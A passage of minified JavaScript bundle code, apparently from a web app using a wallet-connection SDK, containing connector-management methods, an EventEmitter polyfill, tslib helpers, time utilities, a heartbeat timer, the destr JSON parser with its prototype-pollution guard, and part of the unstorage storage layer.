e,r,n;if(t.id===Z.CONNECTOR_ID.AUTH){const i=t,s=ju(te.state),o=jr.getSnapshot().themeMode,a=jr.getSnapshot().themeVariables;(r=(e=i==null?void 0:i.provider)==null?void 0:e.syncDappData)==null||r.call(e,{metadata:s.metadata,sdkVersion:s.sdkVersion,projectId:s.projectId,sdkType:s.sdkType}),(n=i==null?void 0:i.provider)==null||n.syncTheme({themeMode:o,themeVariables:a,w3mThemeVariables:hs(a,o)}),this.setConnectors([t])}else this.setConnectors([t])},getAuthConnector(t){var n;const e=t||q.state.activeChain,r=ot.connectors.find(i=>i.id===Z.CONNECTOR_ID.AUTH);if(r)return(n=r==null?void 0:r.connectors)!=null&&n.length?r.connectors.find(s=>s.chain===e):r},getAnnouncedConnectorRdns(){return ot.connectors.filter(t=>t.type==="ANNOUNCED").map(t=>{var e;return(e=t.info)==null?void 0:e.rdns})},getConnectorById(t){return ot.allConnectors.find(e=>e.id===t)},getConnector(t,e){return ot.allConnectors.filter(n=>n.chain===q.state.activeChain).find(n=>{var i;return n.explorerId===t||((i=n.info)==null?void 0:i.rdns)===e})},syncIfAuthConnector(t){var s,o;if(t.id!=="ID_AUTH")return;const e=t,r=ju(te.state),n=jr.getSnapshot().themeMode,i=jr.getSnapshot().themeVariables;(o=(s=e==null?void 0:e.provider)==null?void 0:s.syncDappData)==null||o.call(s,{metadata:r.metadata,sdkVersion:r.sdkVersion,sdkType:r.sdkType,projectId:r.projectId}),e.provider.syncTheme({themeMode:n,themeVariables:i,w3mThemeVariables:hs(i,n)})},getConnectorsByNamespace(t){const e=ot.allConnectors.filter(r=>r.chain===t);return this.mergeMultiChainConnectors(e)},selectWalletConnector(t){const e=Oe.getConnector(t.id,t.rdns);q.state.activeChain===Z.CHAIN.SOLANA&&TS.handleSolanaDeeplinkRedirect((e==null?void 0:e.name)||t.name||""),e?at.push("ConnectingExternal",{connector:e}):at.push("ConnectingWalletConnect",{wallet:t})},getConnectors(t){return t?this.getConnectorsByNamespace(t):this.mergeMultiChainConnectors(ot.allConnectors)},setFilterByNamespace(t){ot.filterByNamespace=t,ot.connectors=this.getConnectors(t),xe.setFilterByNamespace(t)},setConnectorId(t,e){t&&(ot.activeConnectorIds={...ot.activeConnectorIds,[e]:t},le.setConnectedConnectorId(e,t))},removeConnectorId(t){ot.activeConnectorIds={...ot.activeConnectorIds,[t]:void 0},le.deleteConnectedConnectorId(t)},getConnectorId(t){if(t)return ot.activeConnectorIds[t]},isConnected(t){return t?!!ot.activeConnectorIds[t]:Object.values(ot.activeConnectorIds).some(e=>!!e)},resetConnectorIds(){ot.activeConnectorIds={...P1}}};function _h(t,e){return Oe.getConnectorId(t)===e}function LS(t){const e=Array.from(q.state.chains.keys());let r=[];return t?(r.push([t,q.state.chains.get(t)]),_h(t,Z.CONNECTOR_ID.WALLET_CONNECT)?e.forEach(n=>{n!==t&&_h(n,Z.CONNECTOR_ID.WALLET_CONNECT)&&r.push([n,q.state.chains.get(n)])}):_h(t,Z.CONNECTOR_ID.AUTH)&&e.forEach(n=>{n!==t&&_h(n,Z.CONNECTOR_ID.AUTH)&&r.push([n,q.state.chains.get(n)])})):r=Array.from(q.state.chains.entries()),r}var Ch={exports:{}},cw;function FS(){if(cw)return Ch.exports;cw=1;var t=typeof Reflect=="object"?Reflect:null,e=t&&typeof t.apply=="function"?t.apply:function(S,C,O){return Function.prototype.apply.call(S,C,O)},r;t&&typeof t.ownKeys=="function"?r=t.ownKeys:Object.getOwnPropertySymbols?r=function(S){return Object.getOwnPropertyNames(S).concat(Object.getOwnPropertySymbols(S))}:r=function(S){return Object.getOwnPropertyNames(S)};function n(P){console&&console.warn&&console.warn(P)}var i=Number.isNaN||function(S){return S!==S};function s(){s.init.call(this)}Ch.exports=s,Ch.exports.once=A,s.EventEmitter=s,s.prototype._events=void 0,s.prototype._eventsCount=0,s.prototype._maxListeners=void 0;var o=10;function a(P){if(typeof P!="function")throw new TypeError('The "listener" argument must be of type Function. Received type '+typeof P)}Object.defineProperty(s,"defaultMaxListeners",{enumerable:!0,get:function(){return o},set:function(P){if(typeof P!="number"||P<0||i(P))throw new RangeError('The value of "defaultMaxListeners" is out of range. It must be a non-negative number. Received '+P+".");o=P}}),s.init=function(){(this._events===void 0||this._events===Object.getPrototypeOf(this)._events)&&(this._events=Object.create(null),this._eventsCount=0),this._maxListeners=this._maxListeners||void 0},s.prototype.setMaxListeners=function(S){if(typeof S!="number"||S<0||i(S))throw new RangeError('The value of "n" is out of range. It must be a non-negative number. Received '+S+".");return this._maxListeners=S,this};function c(P){return P._maxListeners===void 0?s.defaultMaxListeners:P._maxListeners}s.prototype.getMaxListeners=function(){return c(this)},s.prototype.emit=function(S){for(var C=[],O=1;O<arguments.length;O++)C.push(arguments[O]);var $=S==="error",D=this._events;if(D!==void 0)$=$&&D.error===void 0;else if(!$)return!1;if($){var F;if(C.length>0&&(F=C[0]),F instanceof Error)throw F;var j=new Error("Unhandled error."+(F?" ("+F.message+")":""));throw j.context=F,j}var L=D[S];if(L===void 0)return!1;if(typeof L=="function")e(L,this,C);else for(var N=L.length,f=y(L,N),O=0;O<N;++O)e(f[O],this,C);return!0};function u(P,S,C,O){var $,D,F;if(a(C),D=P._events,D===void 0?(D=P._events=Object.create(null),P._eventsCount=0):(D.newListener!==void 0&&(P.emit("newListener",S,C.listener?C.listener:C),D=P._events),F=D[S]),F===void 0)F=D[S]=C,++P._eventsCount;else if(typeof F=="function"?F=D[S]=O?[C,F]:[F,C]:O?F.unshift(C):F.push(C),$=c(P),$>0&&F.length>$&&!F.warned){F.warned=!0;var j=new Error("Possible EventEmitter memory leak detected. "+F.length+" "+String(S)+" listeners added. Use emitter.setMaxListeners() to increase limit");j.name="MaxListenersExceededWarning",j.emitter=P,j.type=S,j.count=F.length,n(j)}return P}s.prototype.addListener=function(S,C){return u(this,S,C,!1)},s.prototype.on=s.prototype.addListener,s.prototype.prependListener=function(S,C){return u(this,S,C,!0)};function l(){if(!this.fired)return this.target.removeListener(this.type,this.wrapFn),this.fired=!0,arguments.length===0?this.listener.call(this.target):this.listener.apply(this.target,arguments)}function h(P,S,C){var O={fired:!1,wrapFn:void 0,target:P,type:S,listener:C},$=l.bind(O);return $.listener=C,O.wrapFn=$,$}s.prototype.once=function(S,C){return a(C),this.on(S,h(this,S,C)),this},s.prototype.prependOnceListener=function(S,C){return a(C),this.prependListener(S,h(this,S,C)),this},s.prototype.removeListener=function(S,C){var O,$,D,F,j;if(a(C),$=this._events,$===void 0)return this;if(O=$[S],O===void 0)return this;if(O===C||O.listener===C)--this._eventsCount===0?this._events=Object.create(null):(delete $[S],$.removeListener&&this.emit("removeListener",S,O.listener||C));else if(typeof O!="function"){for(D=-1,F=O.length-1;F>=0;F--)if(O[F]===C||O[F].listener===C){j=O[F].listener,D=F;break}if(D<0)return this;D===0?O.shift():m(O,D),O.length===1&&($[S]=O[0]),$.removeListener!==void 0&&this.emit("removeListener",S,j||C)}return this},s.prototype.off=s.prototype.removeListener,s.prototype.removeAllListeners=function(S){var C,O,$;if(O=this._events,O===void 0)return this;if(O.removeListener===void 0)return arguments.length===0?(this._events=Object.create(null),this._eventsCount=0):O[S]!==void 0&&(--this._eventsCount===0?this._events=Object.create(null):delete O[S]),this;if(arguments.length===0){var D=Object.keys(O),F;for($=0;$<D.length;++$)F=D[$],F!=="removeListener"&&this.removeAllListeners(F);return this.removeAllListeners("removeListener"),this._events=Object.create(null),this._eventsCount=0,this}if(C=O[S],typeof C=="function")this.removeListener(S,C);else if(C!==void 0)for($=C.length-1;$>=0;$--)this.removeListener(S,C[$]);return this};function d(P,S,C){var O=P._events;if(O===void 0)return[];var $=O[S];return $===void 0?[]:typeof $=="function"?C?[$.listener||$]:[$]:C?b($):y($,$.length)}s.prototype.listeners=function(S){return d(this,S,!0)},s.prototype.rawListeners=function(S){return d(this,S,!1)},s.listenerCount=function(P,S){return typeof P.listenerCount=="function"?P.listenerCount(S):g.call(P,S)},s.prototype.listenerCount=g;function g(P){var S=this._events;if(S!==void 0){var C=S[P];if(typeof C=="function")return 1;if(C!==void 0)return C.length}return 0}s.prototype.eventNames=function(){return this._eventsCount>0?r(this._events):[]};function y(P,S){for(var C=new Array(S),O=0;O<S;++O)C[O]=P[O];return C}function m(P,S){for(;S+1<P.length;S++)P[S]=P[S+1];P.pop()}function b(P){for(var S=new Array(P.length),C=0;C<S.length;++C)S[C]=P[C].listener||P[C];return S}function A(P,S){return new Promise(function(C,O){function $(F){P.removeListener(S,D),O(F)}function D(){typeof P.removeListener=="function"&&P.removeListener("error",$),C([].slice.call(arguments))}T(P,S,D,{once:!0}),S!=="error"&&_(P,$,{once:!0})})}function _(P,S,C){typeof P.on=="function"&&T(P,"error",S,C)}function T(P,S,C,O){if(typeof P.on=="function")O.once?P.once(S,C):P.on(S,C);else if(typeof P.addEventListener=="function")P.addEventListener(S,function $(D){O.once&&P.removeEventListener(S,$),C(D)});else throw new TypeError('The "emitter" argument must be of type EventEmitter. Received type '+typeof P)}return Ch.exports}var Vn=FS();const H0=co(Vn);var Sp={};/*! *****************************************************************************
Copyright (c) Microsoft Corporation.

Permission to use, copy, modify, and/or distribute this software for any
purpose with or without fee is hereby granted.

THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES WITH
REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF MERCHANTABILITY
AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY SPECIAL, DIRECT,
INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES WHATSOEVER RESULTING FROM
LOSS OF USE, DATA OR PROFITS, WHETHER IN AN ACTION OF CONTRACT, NEGLIGENCE OR
OTHER TORTIOUS ACTION, ARISING OUT OF OR IN CONNECTION WITH THE USE OR
PERFORMANCE OF THIS SOFTWARE.
***************************************************************************** */var fm=function(t,e){return fm=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(r,n){r.__proto__=n}||function(r,n){for(var i in n)n.hasOwnProperty(i)&&(r[i]=n[i])},fm(t,e)};function jS(t,e){fm(t,e);function r(){this.constructor=t}t.prototype=e===null?Object.create(e):(r.prototype=e.prototype,new r)}var pm=function(){return pm=Object.assign||function(e){for(var r,n=1,i=arguments.length;n<i;n++){r=arguments[n];for(var s in r)Object.prototype.hasOwnProperty.call(r,s)&&(e[s]=r[s])}return e},pm.apply(this,arguments)};function qS(t,e){var r={};for(var n in t)Object.prototype.hasOwnProperty.call(t,n)&&e.indexOf(n)<0&&(r[n]=t[n]);if(t!=null&&typeof Object.getOwnPropertySymbols=="function")for(var i=0,n=Object.getOwnPropertySymbols(t);i<n.length;i++)e.indexOf(n[i])<0&&Object.prototype.propertyIsEnumerable.call(t,n[i])&&(r[n[i]]=t[n[i]]);return r}function zS(t,e,r,n){var i=arguments.length,s=i<3?e:n===null?n=Object.getOwnPropertyDescriptor(e,r):n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s}function HS(t,e){return function(r,n){e(r,n,t)}}function WS(t,e){if(typeof Reflect=="object"&&typeof Reflect.metadata=="function")return Reflect.metadata(t,e)}function GS(t,e,r,n){function i(s){return s instanceof r?s:new r(function(o){o(s)})}return new(r||(r=Promise))(function(s,o){function a(l){try{u(n.next(l))}catch(h){o(h)}}function c(l){try{u(n.throw(l))}catch(h){o(h)}}function u(l){l.done?s(l.value):i(l.value).then(a,c)}u((n=n.apply(t,e||[])).next())})}function VS(t,e){var r={label:0,sent:function(){if(s[0]&1)throw s[1];return s[1]},trys:[],ops:[]},n,i,s,o;return o={next:a(0),throw:a(1),return:a(2)},typeof Symbol=="function"&&(o[Symbol.iterator]=function(){return this}),o;function a(u){return function(l){return c([u,l])}}function c(u){if(n)throw new TypeError("Generator is already executing.");for(;r;)try{if(n=1,i&&(s=u[0]&2?i.return:u[0]?i.throw||((s=i.return)&&s.call(i),0):i.next)&&!(s=s.call(i,u[1])).done)return s;switch(i=0,s&&(u=[u[0]&2,s.value]),u[0]){case 0:case 1:s=u;break;case 4:return r.label++,{value:u[1],done:!1};case 5:r.label++,i=u[1],u=[0];continue;case 7:u=r.ops.pop(),r.trys.pop();continue;default:if(s=r.trys,!(s=s.length>0&&s[s.length-1])&&(u[0]===6||u[0]===2)){r=0;continue}if(u[0]===3&&(!s||u[1]>s[0]&&u[1]<s[3])){r.label=u[1];break}if(u[0]===6&&r.label<s[1]){r.label=s[1],s=u;break}if(s&&r.label<s[2]){r.label=s[2],r.ops.push(u);break}s[2]&&r.ops.pop(),r.trys.pop();continue}u=e.call(t,r)}catch(l){u=[6,l],i=0}finally{n=s=0}if(u[0]&5)throw u[1];return{value:u[0]?u[1]:void 0,done:!0}}}function KS(t,e,r,n){n===void 0&&(n=r),t[n]=e[r]}function QS(t,e){for(var r in t)r!=="default"&&!e.hasOwnProperty(r)&&(e[r]=t[r])}function gm(t){var e=typeof Symbol=="function"&&Symbol.iterator,r=e&&t[e],n=0;if(r)return r.call(t);if(t&&typeof t.length=="number")return{next:function(){return t&&n>=t.length&&(t=void 0),{value:t&&t[n++],done:!t}}};throw new TypeError(e?"Object is not iterable.":"Symbol.iterator is not defined.")}function R1(t,e){var r=typeof Symbol=="function"&&t[Symbol.iterator];if(!r)return t;var n=r.call(t),i,s=[],o;try{for(;(e===void 0||e-- >0)&&!(i=n.next()).done;)s.push(i.value)}catch(a){o={error:a}}finally{try{i&&!i.done&&(r=n.return)&&r.call(n)}finally{if(o)throw o.error}}return s}function YS(){for(var t=[],e=0;e<arguments.length;e++)t=t.concat(R1(arguments[e]));return t}function JS(){for(var t=0,e=0,r=arguments.length;e<r;e++)t+=arguments[e].length;for(var n=Array(t),i=0,e=0;e<r;e++)for(var s=arguments[e],o=0,a=s.length;o<a;o++,i++)n[i]=s[o];return n}function zu(t){return this instanceof zu?(this.v=t,this):new zu(t)}function ZS(t,e,r){if(!Symbol.asyncIterator)throw new TypeError("Symbol.asyncIterator is not defined.");var n=r.apply(t,e||[]),i,s=[];return i={},o("next"),o("throw"),o("return"),i[Symbol.asyncIterator]=function(){return this},i;function o(d){n[d]&&(i[d]=function(g){return new Promise(function(y,m){s.push([d,g,y,m])>1||a(d,g)})})}function a(d,g){try{c(n[d](g))}catch(y){h(s[0][3],y)}}function c(d){d.value instanceof zu?Promise.resolve(d.value.v).then(u,l):h(s[0][2],d)}function u(d){a("next",d)}function l(d){a("throw",d)}function h(d,g){d(g),s.shift(),s.length&&a(s[0][0],s[0][1])}}function XS(t){var e,r;return e={},n("next"),n("throw",function(i){throw i}),n("return"),e[Symbol.iterator]=function(){return this},e;function n(i,s){e[i]=t[i]?function(o){return(r=!r)?{value:zu(t[i](o)),done:i==="return"}:s?s(o):o}:s}}function eN(t){if(!Symbol.asyncIterator)throw new TypeError("Symbol.asyncIterator is not defined.");var e=t[Symbol.asyncIterator],r;return e?e.call(t):(t=typeof gm=="function"?gm(t):t[Symbol.iterator](),r={},n("next"),n("throw"),n("return"),r[Symbol.asyncIterator]=function(){return this},r);function n(s){r[s]=t[s]&&function(o){return new Promise(function(a,c){o=t[s](o),i(a,c,o.done,o.value)})}}function i(s,o,a,c){Promise.resolve(c).then(function(u){s({value:u,done:a})},o)}}function tN(t,e){return Object.defineProperty?Object.defineProperty(t,"raw",{value:e}):t.raw=e,t}function rN(t){if(t&&t.__esModule)return t;var e={};if(t!=null)for(var r in t)Object.hasOwnProperty.call(t,r)&&(e[r]=t[r]);return e.default=t,e}function nN(t){return t&&t.__esModule?t:{default:t}}function iN(t,e){if(!e.has(t))throw new TypeError("attempted to get private field on non-instance");return e.get(t)}function sN(t,e,r){if(!e.has(t))throw new TypeError("attempted to set private field on non-instance");return e.set(t,r),r}const oN=Object.freeze(Object.defineProperty({__proto__:null,get __assign(){return pm},__asyncDelegator:XS,__asyncGenerator:ZS,__asyncValues:eN,__await:zu,__awaiter:GS,__classPrivateFieldGet:iN,__classPrivateFieldSet:sN,__createBinding:KS,__decorate:zS,__exportStar:QS,__extends:jS,__generator:VS,__importDefault:nN,__importStar:rN,__makeTemplateObject:tN,__metadata:WS,__param:HS,__read:R1,__rest:qS,__spread:YS,__spreadArrays:JS,__values:gm},Symbol.toStringTag,{value:"Module"})),Ef=z0(oN);var Np={},Jc={},uw;function aN(){if(uw)return Jc;uw=1,Object.defineProperty(Jc,"__esModule",{value:!0}),Jc.delay=void 0;function t(e){return new Promise(r=>{setTimeout(()=>{r(!0)},e)})}return Jc.delay=t,Jc}var _o={},Tp={},Co={},lw;function cN(){return lw||(lw=1,Object.defineProperty(Co,"__esModule",{value:!0}),Co.ONE_THOUSAND=Co.ONE_HUNDRED=void 0,Co.ONE_HUNDRED=100,Co.ONE_THOUSAND=1e3),Co}var Pp={},hw;function uN(){return hw||(hw=1,function(t){Object.defineProperty(t,"__esModule",{value:!0}),t.ONE_YEAR=t.FOUR_WEEKS=t.THREE_WEEKS=t.TWO_WEEKS=t.ONE_WEEK=t.THIRTY_DAYS=t.SEVEN_DAYS=t.FIVE_DAYS=t.THREE_DAYS=t.ONE_DAY=t.TWENTY_FOUR_HOURS=t.TWELVE_HOURS=t.SIX_HOURS=t.THREE_HOURS=t.ONE_HOUR=t.SIXTY_MINUTES=t.THIRTY_MINUTES=t.TEN_MINUTES=t.FIVE_MINUTES=t.ONE_MINUTE=t.SIXTY_SECONDS=t.THIRTY_SECONDS=t.TEN_SECONDS=t.FIVE_SECONDS=t.ONE_SECOND=void 0,t.ONE_SECOND=1,t.FIVE_SECONDS=5,t.TEN_SECONDS=10,t.THIRTY_SECONDS=30,t.SIXTY_SECONDS=60,t.ONE_MINUTE=t.SIXTY_SECONDS,t.FIVE_MINUTES=t.ONE_MINUTE*5,t.TEN_MINUTES=t.ONE_MINUTE*10,t.THIRTY_MINUTES=t.ONE_MINUTE*30,t.SIXTY_MINUTES=t.ONE_MINUTE*60,t.ONE_HOUR=t.SIXTY_MINUTES,t.THREE_HOURS=t.ONE_HOUR*3,t.SIX_HOURS=t.ONE_HOUR*6,t.TWELVE_HOURS=t.ONE_HOUR*12,t.TWENTY_FOUR_HOURS=t.ONE_HOUR*24,t.ONE_DAY=t.TWENTY_FOUR_HOURS,t.THREE_DAYS=t.ONE_DAY*3,t.FIVE_DAYS=t.ONE_DAY*5,t.SEVEN_DAYS=t.ONE_DAY*7,t.THIRTY_DAYS=t.ONE_DAY*30,t.ONE_WEEK=t.SEVEN_DAYS,t.TWO_WEEKS=t.ONE_WEEK*2,t.THREE_WEEKS=t.ONE_WEEK*3,t.FOUR_WEEKS=t.ONE_WEEK*4,t.ONE_YEAR=t.ONE_DAY*365}(Pp)),Pp}var dw;function O1(){return dw||(dw=1,function(t){Object.defineProperty(t,"__esModule",{value:!0});const e=Ef;e.__exportStar(cN(),t),e.__exportStar(uN(),t)}(Tp)),Tp}var fw;function lN(){if(fw)return _o;fw=1,Object.defineProperty(_o,"__esModule",{value:!0}),_o.fromMiliseconds=_o.toMiliseconds=void 0;const t=O1();function e(n){return n*t.ONE_THOUSAND}_o.toMiliseconds=e;function r(n){return Math.floor(n/t.ONE_THOUSAND)}return _o.fromMiliseconds=r,_o}var pw;function hN(){return pw||(pw=1,function(t){Object.defineProperty(t,"__esModule",{value:!0});const e=Ef;e.__exportStar(aN(),t),e.__exportStar(lN(),t)}(Np)),Np}var Ca={},gw;function dN(){if(gw)return Ca;gw=1,Object.defineProperty(Ca,"__esModule",{value:!0}),Ca.Watch=void 0;class t{constructor(){this.timestamps=new Map}start(r){if(this.timestamps.has(r))throw new Error(`Watch already started for label: ${r}`);this.timestamps.set(r,{started:Date.now()})}stop(r){const n=this.get(r);if(typeof n.elapsed<"u")throw new Error(`Watch already stopped for label: ${r}`);const i=Date.now()-n.started;this.timestamps.set(r,{started:n.started,elapsed:i})}get(r){const n=this.timestamps.get(r);if(typeof n>"u")throw new Error(`No timestamp found for label: ${r}`);return n}elapsed(r){const n=this.get(r);return n.elapsed||Date.now()-n.started}}return Ca.Watch=t,Ca.default=t,Ca}var Rp={},Zc={},mw;function fN(){if(mw)return Zc;mw=1,Object.defineProperty(Zc,"__esModule",{value:!0}),Zc.IWatch=void 0;class t{}return Zc.IWatch=t,Zc}var yw;function pN(){return yw||(yw=1,function(t){Object.defineProperty(t,"__esModule",{value:!0}),Ef.__exportStar(fN(),t)}(Rp)),Rp}var ww;function gN(){return ww||(ww=1,function(t){Object.defineProperty(t,"__esModule",{value:!0});const e=Ef;e.__exportStar(hN(),t),e.__exportStar(dN(),t),e.__exportStar(pN(),t),e.__exportStar(O1(),t)}(Sp)),Sp}var se=gN();class ba{}let mN=class extends ba{constructor(e){super()}};const bw=se.FIVE_SECONDS,kc={pulse:"heartbeat_pulse"};let yN=class k1 extends mN{constructor(e){super(e),this.events=new Vn.EventEmitter,this.interval=bw,this.interval=(e==null?void 0:e.interval)||bw}static async init(e){const r=new k1(e);return await r.init(),r}async init(){await this.initialize()}stop(){clearInterval(this.intervalRef)}on(e,r){this.events.on(e,r)}once(e,r){this.events.once(e,r)}off(e,r){this.events.off(e,r)}removeListener(e,r){this.events.removeListener(e,r)}async initialize(){this.intervalRef=setInterval(()=>this.pulse(),se.toMiliseconds(this.interval))}pulse(){this.events.emit(kc.pulse)}};const wN=/"(?:_|\\u0{2}5[Ff]){2}(?:p|\\u0{2}70)(?:r|\\u0{2}72)(?:o|\\u0{2}6[Ff])(?:t|\\u0{2}74)(?:o|\\u0{2}6[Ff])(?:_|\\u0{2}5[Ff]){2}"\s*:/,bN=/"(?:c|\\u0063)(?:o|\\u006[Ff])(?:n|\\u006[Ee])(?:s|\\u0073)(?:t|\\u0074)(?:r|\\u0072)(?:u|\\u0075)(?:c|\\u0063)(?:t|\\u0074)(?:o|\\u006[Ff])(?:r|\\u0072)"\s*:/,vN=/^\s*["[{]|^\s*-?\d{1,16}(\.\d{1,17})?([Ee][+-]?\d+)?\s*$/;function EN(t,e){if(t==="__proto__"||t==="constructor"&&e&&typeof e=="object"&&"prototype"in e){AN(t);return}return e}function AN(t){console.warn(`[destr] Dropping "${t}" key to prevent prototype pollution.`)}function Ih(t,e={}){if(typeof t!="string")return t;if(t[0]==='"'&&t[t.length-1]==='"'&&t.indexOf("\\")===-1)return t.slice(1,-1);const r=t.trim();if(r.length<=9)switch(r.toLowerCase()){case"true":return!0;case"false":return!1;case"undefined":return;case"null":return null;case"nan":return Number.NaN;case"infinity":return Number.POSITIVE_INFINITY;case"-infinity":return Number.NEGATIVE_INFINITY}if(!vN.test(t)){if(e.strict)throw new SyntaxError("[destr] Invalid JSON");return t}try{if(wN.test(t)||bN.test(t)){if(e.strict)throw new Error("[destr] Possible prototype pollution");return JSON.parse(t,EN)}return JSON.parse(t)}catch(n){if(e.strict)throw n;return t}}function _N(t){return!t||typeof t.then!="function"?Promise.resolve(t):t}function yr(t,...e){try{return _N(t(...e))}catch(r){return Promise.reject(r)}}function CN(t){const e=typeof t;return t===null||e!=="object"&&e!=="function"}function IN(t){const e=Object.getPrototypeOf(t);return!e||e.isPrototypeOf(Object)}function rd(t){if(CN(t))return String(t);if(IN(t)||Array.isArray(t))return JSON.stringify(t);if(typeof t.toJSON=="function")return rd(t.toJSON());throw new Error("[unstorage] Cannot stringify value!")}const mm="base64:";function xN(t){return typeof t=="string"?t:mm+TN(t)}function SN(t){return typeof t!="string"||!t.startsWith(mm)?t:NN(t.slice(mm.length))}function NN(t){return globalThis.Buffer?Buffer.from(t,"base64"):Uint8Array.from(globalThis.atob(t),e=>e.codePointAt(0))}function TN(t){return globalThis.Buffer?Buffer.from(t).toString("base64"):globalThis.btoa(String.fromCodePoint(...t))}function cn(t){var e;return t&&((e=t.split("?")[0])==null?void 0:e.replace(/[/\\]/g,":").replace(/:+/g,":").replace(/^:|:$/g,""))||""}function PN(...t){return cn(t.join(":"))}function xh(t){return t=cn(t),t?t+":":""}function RN(t,e){if(e===void 0)return!0;let r=0,n=t.indexOf(":");for(;n>-1;)r++,n=t.indexOf(":",n+1);return r<=e}function ON(t,e){return e?t.startsWith(e)&&t[t.length-1]!=="$":t[t.length-1]!=="$"}const kN="memory",DN=()=>{const t=new Map;return{name:kN,getInstance:()=>t,hasItem(e){return t.has(e)},getItem(e){return t.get(e)??null},getItemRaw(e){return t.get(e)??null},setItem(e,r){t.set(e,r)},setItemRaw(e,r){t.set(e,r)},removeItem(e){t.delete(e)},getKeys(){return[...t.keys()]},clear(){t.clear()},dispose(){t.clear()}}};function MN(t={}){const e={mounts:{"":t.driver||DN()},mountpoints:[""],watching:!1,watchListeners:[],unwatch:{}},r=u=>{for(const l of e.mountpoints)if(u.startsWith(l))return{base:l,relativeKey:u.slice(l.length),driver:e.mounts[l]};return{base:"",relativeKey:u,driver:e.mounts[""]}},n=(u,l)=>e.mountpoints.filter(h=>h.startsWith(u)||l&&u.startsWith(h)).map(h=>({relativeBase:u.length>h.length?u.slice(h.length):void 0,mountpoint:h,driver:e.mounts[h]})),i=(u,l)=>{if(e.watching){l=cn(l);for(const h of e.watchListeners)h(u,l)}},s=async()=>{if(!e.watching){e.watching=!0;for(const u in e.mounts)e.unwatch[u]=await vw(e.mounts[u],i,u)}},o=async()=>{if(e.watching){for(const u in e.unwatch)await e.unwatch[u]();e.unwatch={},e.watching=!1}},a=(u,l,h)=>{const d=new Map,g=y=>{let m=d.get(y.base);return m||(m={driver:y.driver,base:y.base,items:[]},d.set(y.base,m)),m};for(const y of u){const m=typeof y=="string",b=cn(m?y:y.key),A=m?void 0:y.value,_=m||!y.options?l:{...l,...y.options},T=r(b);g(T).items.push({key:b,value:A,relativeKey:T.relativeKey,options:_})}return Promise.all([...d.values()].map(y=>h(y))).then(y=>y.flat())},c={hasItem(u,l={}){u=cn(u);const{relativeKey:h,driver:d}=r(u);return yr(d.hasItem,h,l)},getItem(u,l={}){u=cn(u);const{relativeKey:h,driver:d}=r(u);return yr(d.getItem,h,l).then(g=>Ih(g))},getItems(u,l={}){return a(u,l,h=>h.driver.getItems?yr(h.driver.getItems,h.items.map(d=>({key:d.relativeKey,options:d.options})),l).then(d=>d.map(g=>({key:PN(h.base,g.key),value:Ih(g.value)}))):Promise.all(h.items.map(d=>yr(h.driver.getItem,d.relativeKey,d.options).then(g=>({key:d.key,value:Ih(g)})))))},getItemRaw(u,l={}){u=cn(u);const{relativeKey:h,driver:d}=r(u);return d.getItemRaw?yr(d.getItemRaw,h,l):yr(d.getItem,h,l).then(g=>SN(g))},async setItem(u,l,h={}){if(l===void 0)return c.removeItem(u);u=cn(u);const{relativeKey:d,driver:g}=r(u);g.setItem&&(await yr(g.setItem,d,rd(l),h),g.watch||i("update",u))},async setItems(u,l){await a(u,l,async h=>{if(h.driver.setItems)return yr(h.driver.setItems,h.items.map(d=>({key:d.relativeKey,value:rd(d.value),options:d.options})),l);h.driver.setItem&&await Promise.all(h.items.map(d=>yr(h.driver.setItem,d.relativeKey,rd(d.value),d.options)))})},async setItemRaw(u,l,h={}){if(l===void 0)return c.removeItem(u,h);u=cn(u);const{relativeKey:d,driver:g}=r(u);if(g.setItemRaw)await yr(g.setItemRaw,d,l,h);else if(g.setItem)await yr(g.setItem,d,xN(l),h);else return;g.watch||i("update",u)},async removeItem(u,l={}){typeof l=="boolean"&&(l={removeMeta:l}),u=cn(u);const{relativeKey:h,driver:d}=r(u);d.removeItem&&(await yr(d.removeItem,h,l),(l.removeMeta||l.removeMata)&&await yr(d.removeItem,h+"$",l),d.watch||i("remove",u))},async getMeta(u,l={}){typeof l=="boolean"&&(l={nativeOnly:l}),u=cn(u);const{relativeKey:h,driver:d}=r(u),g=Object.create(null);if(d.getMeta&&Object.assign(g,await yr(d.getMeta,h,l)),!l.nativeOnly){const y=await yr(d.getItem,h+"$",l).then(m=>Ih(m));y&&typeof y=="object"&&(typeof y.atime=="string"&&(y.atime=new Date(y.atime)),typeof y.mtime=="string"&&(y.mtime=new Date(y.mtime)),Object.assign(g,y))}return g},setMeta(u,l,h={}){return this.setItem(u+"$",l,h)},removeMeta(u,l={}){return this.removeItem(u+"$",l)},async getKeys(u,l={}){var b;u=xh(u);const h=n(u,!0);let d=[];const g=[];let y=!0;for(const A of h){(b=A.driver.flags)!=null&&b.maxDepth||(y=!1);const _=await yr(A.driver.getKeys,A.relativeBase,l);for(const T of _){const P=A.mountpoint+cn(T);d.some(S=>P.startsWith(S))||g.push(P)}d=[A.mountpoint,...d.filter(T=>!T.startsWith(A.mountpoint))]}const m=l.maxDepth!==void 0&&!y;return g.filter(A=>(!m||RN(A,l.maxDepth))&&ON(A,u))},async clear(u,l={}){u=xh(u),await Promise.all(n(u,!1).map(async h=>{if(h.driver.clear)return yr(h.driver.clear,h.relativeBase,l);if(h.driver.removeItem){const d=await h.driver.getKeys(h.relativeBase||"",l);return Promise.all(d.map(g=>h.driver.removeItem(g,l)))}}))},async dispose(){await Promise.all(Object.values(e.mounts).map(u=>Ew(u)))},async watch(u){return await s(),e.watchListeners.push(u),async()=>{e.watchListeners=e.watchListeners.filter(l=>l!==u),e.watchListeners.length===0&&await o()}},async unwatch(){e.watchListeners=[],await o()},mount(u,l){if(u=xh(u),u&&e.mounts[u])throw new Error(`already mounted at ${u}`);return u&&(e.mountpoints.push(u),e.mountpoints.sort((h,d)=>d.length-h.length)),e.mounts[u]=l,e.watching&&Promise.resolve(vw(l,i,u)).then(h=>{e.unwatch[u]=h}).catch(console.error),c},async unmount(u,l=!0){var h,d;u=xh(u),!(!u||!e.mounts[u])&&(e.watching&&u in 